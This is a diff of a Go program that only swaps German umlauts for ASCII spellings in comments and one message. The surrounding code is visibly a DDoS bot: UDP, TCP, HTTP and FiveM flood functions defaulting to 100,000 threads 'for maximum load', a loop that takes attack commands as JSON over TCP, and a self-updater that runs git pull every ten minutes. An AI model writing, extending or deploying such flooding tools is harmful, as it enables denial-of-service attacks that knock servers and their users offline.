@@ -25,7 +25,7 @@ type AttackCommand struct {
 func checkForUpdates() {
 	for {
 		time.Sleep(10 * time.Minute)
-		// Prüft GitHub Repository auf Änderungen (git pull)
+		// Prueft GitHub Repository auf Aenderungen (git pull)
 		cmd := exec.Command("git", "pull")
 		output, err := cmd.CombinedOutput()
 		if err == nil && !strings.Contains(string(output), "Already up to date") {
@@ -61,7 +61,7 @@ func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int, stop chan str
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 100000 // Erhöht auf 100k für maximale Last (wie gewünscht)
+		THREADS = 100000 // Erhoeht auf 100k fuer maximale Last (wie gewuenscht)
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -99,7 +99,7 @@ func TcpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 100000 // Erhöht auf 100k
+		THREADS = 100000 // Erhoeht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -143,7 +143,7 @@ func HttpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 100000 // Erhöht auf 100k
+		THREADS = 100000 // Erhoeht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -190,7 +190,7 @@ func FiveMFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	}
 
 	if THREADS <= 0 {
-		THREADS = 100000 // Erhöht auf 100k
+		THREADS = 100000 // Erhoeht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -237,7 +237,7 @@ func main() {
 			continue
 		}
 
-		fmt.Println("Verbunden über TCP! Warte auf Befehle...")
+		fmt.Println("Verbunden ueber TCP! Warte auf Befehle...")
 		decoder := json.NewDecoder(conn)
 
 		// Standby-Mechanismus: Erstellen eines Kanals zum Stoppen laufender Aktionen
